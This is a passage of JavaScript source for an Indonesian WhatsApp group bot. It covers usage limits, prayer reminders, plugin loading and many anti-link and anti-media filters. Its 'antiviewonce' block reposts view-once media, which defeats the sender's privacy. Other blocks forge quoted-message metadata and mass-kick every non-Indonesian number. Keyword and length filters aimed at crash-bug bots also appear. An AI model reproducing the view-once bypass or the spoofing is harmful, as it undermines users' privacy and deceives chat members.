// Inisialisasi user jika belum ada
if (!db.data.users[m.sender]) {
  db.data.users[m.sender] = {
    limit: 10,
    exp: 0,
    coin: 0,
  }
}

let limitnya = db.data.users[m.sender].limit

async function uselimit() {
  if (isOwner || isPrem) return
  db.data.users[m.sender].limit -= 1
}

const onlylimit = async () => {
  let yameteh = `*乂 Limit - Habis*

Maaf kak @${sender.split('@')[0]} limit kamu sudah habis!
Silakan beli premium untuk mendapatkan limit tanpa batas ke owner.
Ketik .owner`
  await Alice.sendMessage(m.chat, {
    text: yameteh,
    mentions: [m.sender]
  }, { quoted: m })
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Get Suprise
if(!('hadiah' in db.data.settings)) db.data.settings.hadiah = []
if(!('hadiahkadaluwarsa' in db.data.settings)) db.data.settings.hadiahkadaluwarsa = []
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
const user = global.db.data.users[m.sender] 
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}

const reply = async(teks) => {Alice.sendMessage(m.chat, {text: teks, mentions: await ments(teks)},{quoted: m})}

    const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": budy || m.mtype,
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}                
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Auto Shalat Detek Jam
//————————————————————————//
Alice.autoshalat = Alice.autoshalat || {};
let id = m.chat;
if (global.autoshalat && m.isGroup && id in Alice.autoshalat) {
    const jadwalSholat = {
        shubuh: "04:29",
        terbit: "05:44",
        dhuha: "06:16",
        dzuhur: "12:02",
        ashar: "15:15",
        magrib: "17:52",
        isya: "19:01",
    };

    const datek = new Date(
        new Date().toLocaleString("en-US", {
            timeZone: "Asia/Jakarta",
        })
    );

    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;

    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
        if (timeNow === waktu) {
            Alice.autoshalat[id] = [
                Alice.sendMessage(m.chat, {
                    audio: {
                        url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ',
                    },
                    mimetype: 'audio/mp4',
                    ptt: true,
                    contextInfo: {
                        mentions: participants.map(a => a.id),
                        externalAdreply: {
                            showAdAttribution: true,
                            mediaType: 1,
                            mediaUrl: '',
                            title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
                            body: `🕑 ${waktu}`,
                            sourceUrl: xtele,
                            thumbnailUrl: `https://i.top4top.io/p_3193v20ky1.jpg`,
                            renderLargerThumbnail: true,
                        },
                    },
                }, {
                    quoted: m,
                }),

                setTimeout(() => {
                    delete Alice.autoshalat[m.chat];
                }, 57000),
            ];
        }
    }
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Get Total Fitur
let totalfitur = () =>{
var mytext = fs.readFileSync("./Alice.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
        }       
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Listcase                
//————————————————————————//        
const listCase = () => {
const code = fs.readFileSync("./Alice.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
} 
let teks = Styles(`*Total Case*: ${matches.length} \n\n`)
matches.forEach(function (x) {
   teks += "  ◦  " + x + "\n"
})
return teks
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Sessions Auto Ai
const SESSION_FILE = "./AliceDatabase/ai_sessions.json";
 
let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};
 
function saveSession() {
    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Uno Game
const unoDatabasePath = './AliceDatabase/uno_games.json';

function readUnoGameData() {
    if (fs.existsSync(unoDatabasePath)) {
        const data = fs.readFileSync(unoDatabasePath);
        return JSON.parse(data);
    }
    return {};
}

function writeUnoGameData(data) {
    fs.writeFileSync(unoDatabasePath, JSON.stringify(data, null, 2));
}

const gamesFilePath = './AliceDatabase/games.json';

function readGamesData() {
    if (!fs.existsSync(gamesFilePath)) {
        fs.writeFileSync(gamesFilePath, JSON.stringify({}));
    }
    const data = fs.readFileSync(gamesFilePath);
    return JSON.parse(data);
}

function writeGamesData(data) {
    fs.writeFileSync(gamesFilePath, JSON.stringify(data, null, 2));
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Badwords ( Group )
//————————————————————————//
const badwords = JSON.parse(fs.readFileSync('./AliceDatabase/badwords.json'))
const addbadwords = async (kata) => {
let badwords=JSON.parse(fs.readFileSync('./AliceDatabase/badwords.json'))
badwords.push(kata)
fs.writeFileSync('./AliceDatabase/badwords.json',JSON.stringify(badwords))
reply(`Kata kasar "${kata}" berhasil ditambahkan.`)
}

const deletebadwords = async (kata) => {
let badwords=JSON.parse(fs.readFileSync('./AliceDatabase/badwords.json'))
badwords=badwords.filter(word=>word!==kata)
fs.writeFileSync('./AliceDatabase/badwords.json',JSON.stringify(badwords))
reply(`Kata kasar "${kata}" berhasil dihapus.`)
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
if (!Alice.public) {
if (!mek.key.isOwner) return
if (!m.key.fromMe) return
}

// Contoh penggunaan
if (command) {
	if (isFiltered(m.chat) && !isOwner && !isPrem && !m.key.fromMe) return reply(`Don't spam! please give pause for a few seconds.`)
	addFilter(m.chat);
};
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Downloader mp4/mp3
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Afk
if (m.isGroup && !m.key.fromMe) {
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let ment of mentionUser) {
if (afk.checkAfkUser(ment, _afk)) {
let getId2 = afk.getAfkId(ment, _afk)
let getReason2 = afk.getAfkReason(getId2, _afk)
let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
let heheh2 = msx(getTimee)
reply(`Jangan tag dia! dia sedang AFK\n\nAlasan: ${getReason2}\nSejak: ${heheh2.hours} jam, ${heheh2.minutes} menit, ${heheh2.seconds} detik yang lalu\n`)
}}

if (body && afk.checkAfkUser(m.sender, _afk)) {
let getId = afk.getAfkId(m.sender, _afk)
let getReason = afk.getAfkReason(getId, _afk)
let getTime = Date.now() - afk.getAfkTime(getId, _afk)
let heheh = msx(getTime)
_afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Afk/afk.json', JSON.stringify(_afk))
Alice.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari AFK\n\nAlasan: ${getReason}\nSelama: ${heheh.hours} jam, ${heheh.minutes} menit, ${heheh.seconds} detik\n`, xy)
}}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Console Log Message
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
Alice.sendPresenceUpdate('available', m.chat)
  const b = body;
  console.log(
    `\x1b[1;31m~\x1b[1;37m> [\x1b[1;32m ▧ ᴍᴇssᴀɢᴇ ʟᴏɢ \x1b[1;37m]\n│ » ᴛɪᴍᴇ ${chalk.yellow(time)}\n│ » ғʀᴏᴍ ${chalk.red(pushname)}\n│ » ᴀʀᴇ ᴀᴛ ${chalk.yellow(
      groupName ? groupName : "Pᴠ || ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ"
    )}\n│ » ᴀʀɢs : ${chalk.white(args.length)}\n│ » ᴍᴇssᴀɢᴇ : ${chalk.green(b)}\n└───···`
  );
            }
//————————————————————————//
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: Alice.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Alice.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
Alice.ev.emit('messages.upsert', msg)
}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// AMBIL PP USER
try {
    var ppuser = await Alice.profilePictureUrl(m.sender, 'image');
} catch (err) {
    var ppuser = 'https://telegra.ph/file/6880771a42bad09dd6087.jpg';
}

let ppnyauser = await getBuffer(ppuser);
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Tempat Plugins Disini ↓
// Plugins Directory
const loadPlugins = (directory) => {
    let plugins = []
    const folders = fs.readdirSync(directory)
    folders.forEach(folder => {
        const folderPath = path.join(directory, folder)
        if (fs.lstatSync(folderPath).isDirectory()) {
            const files = fs.readdirSync(folderPath)
            files.forEach(file => {
                const filePath = path.join(folderPath, file)
                if (filePath.endsWith(".js")) {
try {
    delete require.cache[require.resolve(filePath)]
    const plugin = require(filePath)
    plugin.filePath = filePath
    plugins.push(plugin)
} catch (error) {
    console.error(`Error loading plugin at ${filePath}:`, error)
}
                }
            })
        }
    })
    return plugins
}
// Plugins
const plugins = loadPlugins(path.resolve(__dirname, "./AlicePlugins"))
const context = { Alice, txt2, reply, isBan, xy, XReaction, m, chatUpdate, store, body, require, smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, budy, prefix, isCmd, command, args, pushname, text, q, quoted, mime, isMedia, botNumber, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, time, salam, reply }
let handled = false
for (const plugin of plugins) {
    if (plugin.command.includes(command)) {
        try {
            await plugin.operate(context)
            handled = true
        } catch (error) {
            console.error(`Error executing plugin ${plugin.filePath}:`, error)
        }
        break
    }
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//DB PREFIX
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
let isNumber = x => typeof x === 'number' && !isNaN(x)
let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!('autoread' in setting)) setting.autoread = false
				if (!("autoTyping" in setting)) setting.autoTyping = false
				if (!("autoRecord" in setting)) setting.autoRecord = true
				if (!("setPrefix" in setting)) setting.setPrefix = "one" //multi, no, all				
                if (!isNumber(setting.status)) setting.status = 0
            } else global.db.data.settings[botNumber] = {
                status: 0,
				autoTyping: false,
				autoRecord: false,
				setPrefix: "one", //multi, no, all
				autoread: false                
            }
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTI Link Dan Sejenisnya ( Group )
//————————————————————————//

if (!m.key.fromMe && db.data.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await Alice.readMessages([readkey]);
}

        //antiviewonce
    if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await Alice.sendMessage(m.chat, { forward: val }, { quoted: m })
    }

 //📈————————————————————————— [ © XyrooRynzz ]—————————————————————————📉\\
// ANTI promotion
if (db.data.chats[m.chat].antipromotion) {
if (budy.match(`Buy|Promo|Sell|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
if (!isBotAdmins) return
if(isOwner) return
if (isAdmins) return
                Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTI BOT
if (m.isBaileys && m.fromMe) {
          reply(`*Bot Lain Terdeteksi*\n\n*Bot Akan Di Keluarkan, Karena Admin Mengaktifkan Anti Bot*`)
    await Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTI MEDIA
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTI IMAGE
        if (db.data.chats[m.chat].image && isXMEDIA) {
    if(isXMEDIA === "imageMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTI VIDEO
        if (db.data.chats[m.chat].antivideo && isXMEDIA) {
    if(isXMEDIA === "videoMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTU STICKER
        if (db.data.chats[m.chat].antisticker && isXMEDIA) {
    if(isXMEDIA === "stickerMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTI AUDIO
        if (db.data.chats[m.chat].antiaudio && isXMEDIA) {
    if(isXMEDIA === "audioMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTI POLLING
       if (db.data.chats[m.chat].antipoll && isXMEDIA) {
    if(isXMEDIA === "pollCreationMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTI LOCATION
       if (db.data.chats[m.chat].antilocation && isXMEDIA) {
    if(isXMEDIA === "locationMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTI DOCUMENT
       if (db.data.chats[m.chat].antidocument && isXMEDIA) {
    if(isXMEDIA === "documentMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTI CONTACT
      if (db.data.chats[m.chat].anticontact && isXMEDIA) {
    if(isXMEDIA === "contactMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
  
// AutoBio  
if (global.autobio) {
const status = `${botname} Online, ${runtime(process.uptime())}\ `;
Alice.updateProfileStatus(status).catch(_ => _);
}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTI Link kick
if (db.data.chats[m.chat].antilinkkick) {
            if (budy.match(`https://`)) {
                let gclink = (`https://`)
                let isLinkThisGc = new RegExp(gclink, 'i')
                if (isAdmins) return reply(`Admin bebas`)
                if (isOwner) return reply(`Owner Bebas`)
                Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTI LINK GC DEL
if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
               await Alice.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Alice.sendMessage(m.chat, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
            }
        }

if (AntiLink)
if (budy.toLowerCase().includes("chat.whatsapp.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
 //📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ANTIwame 
if (AntiWame)
if (budy.toLowerCase().includes("wa.me")){
if (!isBotAdmins) return
bvl = `\`\`\`「 wame Link Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wame, admin bebas kirim link apapun`
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
kice = m.sender
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 wame Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wame link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted: m})
} else {
}
//antivirtex 
  if (AntiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return XRBADM()
  await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Alice.sendMessage(m.chat, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
  }
  }
//anti bad words 
if (AntiToxic && !budy.includes("deletebadwords") && !budy.includes("delbadwords"))
if (badwords.some(word => budy.toLowerCase().includes(word))){
if (!isBotAdmins) return
bvl = `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin bebas menggunakan kata kasar`
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\n${pushname} Mohon tidak menggunakan kata kasar di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antiasing 
if (m.isGroup && isBotAdmins && AntiAsing) {
let member = await participants.map((x) => x.id)
for (let i = 0; i < participants.length; i++) {
if (member[i].slice(0, 2) !== "62") {
let usersId = await participants.find((u) => u.id == member[i])
if (!groupAdmins && !isOwner) {
} else
await Alice.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//antilink youtube video 
if (AntiLinkYoutubeVid)
if (budy.toLowerCase().includes("youtu.be")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink youtube channel 
if (AntiLinkYoutubeChannel)
if (budy.toLowerCase().includes("youtube.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink instagram 
if (AntiLinkInstagram)
if (budy.toLowerCase().includes("instagram.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink facebook 
if (AntiLinkFacebook)
if (budy.toLowerCase().includes("facebook.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink telegram 
if (AntiLinkTelegram)
if (budy.toLowerCase().includes("t.me")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink tiktok 
if (AntiLinkTiktok)
if (budy.toLowerCase().includes("tiktok.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink twitter 
if (AntiLinkTwitter)
if (budy.toLowerCase().includes("twitter.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim twitter link di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink all 
if (AntiLinkAll)
if (budy.toLowerCase().includes("http")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
